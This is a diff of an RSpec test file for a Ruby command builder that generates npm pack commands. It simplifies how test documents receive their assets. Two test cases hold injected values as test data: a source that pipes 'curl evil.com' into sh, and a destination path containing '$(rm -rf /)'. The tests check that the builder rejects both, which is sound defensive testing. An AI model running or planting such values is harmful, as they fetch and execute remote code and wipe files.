@@ -47,13 +47,9 @@ RSpec.describe NlspecToDot::Planner::TemplateCommandBuilder do
 
     context "with assets" do
       let(:document) do
-        doc = build(:document, :full)
-        allow(doc).to receive(:respond_to?).and_call_original
-        allow(doc).to receive(:respond_to?).with(:assets).and_return(true)
-        allow(doc).to receive(:assets).and_return([
+        build(:document, :full, assets: [
           {name: "chart.js", source: "npm:chart.js@4.4.4", destination: "vendor/javascript/chart.umd.js"}
         ])
-        doc
       end
 
       it "generates npm pack commands" do
@@ -69,13 +65,9 @@ RSpec.describe NlspecToDot::Planner::TemplateCommandBuilder do
 
     context "with malicious asset source" do
       let(:document) do
-        doc = build(:document, :full)
-        allow(doc).to receive(:respond_to?).and_call_original
-        allow(doc).to receive(:respond_to?).with(:assets).and_return(true)
-        allow(doc).to receive(:assets).and_return([
+        build(:document, :full, assets: [
           {name: "evil", source: "npm:foo; curl evil.com | sh", destination: "vendor/javascript/foo.js"}
         ])
-        doc
       end
 
       it "raises ArgumentError" do
@@ -85,13 +77,9 @@ RSpec.describe NlspecToDot::Planner::TemplateCommandBuilder do
 
     context "with malicious destination path" do
       let(:document) do
-        doc = build(:document, :full)
-        allow(doc).to receive(:respond_to?).and_call_original
-        allow(doc).to receive(:respond_to?).with(:assets).and_return(true)
-        allow(doc).to receive(:assets).and_return([
+        build(:document, :full, assets: [
           {name: "evil", source: "npm:chart.js@4.4.4", destination: "/tmp/$(rm -rf /)"}
         ])
-        doc
       end
 
       it "raises ArgumentError" do
